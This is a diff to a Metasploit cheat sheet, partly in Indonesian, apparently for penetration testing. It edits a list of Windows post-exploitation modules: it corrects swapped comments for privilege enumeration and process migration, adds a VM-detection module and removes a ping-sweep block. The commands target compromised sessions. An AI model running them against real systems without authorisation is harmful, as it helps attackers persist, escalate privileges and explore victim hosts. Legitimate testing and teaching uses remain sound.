@@ -677,18 +677,23 @@ sessions -l
 #### Windows Post Exploitation Modules
 
 ```bash
-# Migrate sistem
+# Windows Priv Enumeration
 use post/windows/gather/win_privs
 set SESSION <id>
 run
 
-# Windows Priv Enumeration
+# Migrate sistem
 use post/windows/manage/migrate
 set SESSION <id>
 run
 
 # Enumerate logged on users
 use post/windows/gather/enum_logged_on_users
+set SESSION <id>
+run
+
+# Enumerate virtual machine
+use post/windows/gather/checkvm
 set SESSION <id>
 run
 
@@ -724,12 +729,6 @@ run
 
 # Local exploit suggester — cari celah PrivEsc
 use post/multi/recon/local_exploit_suggester
-set SESSION <id>
-run
-
-# Network enumeration dari dalam target
-use post/multi/gather/ping_sweep
-set RHOSTS 192.168.2.0/24
 set SESSION <id>
 run
 ```
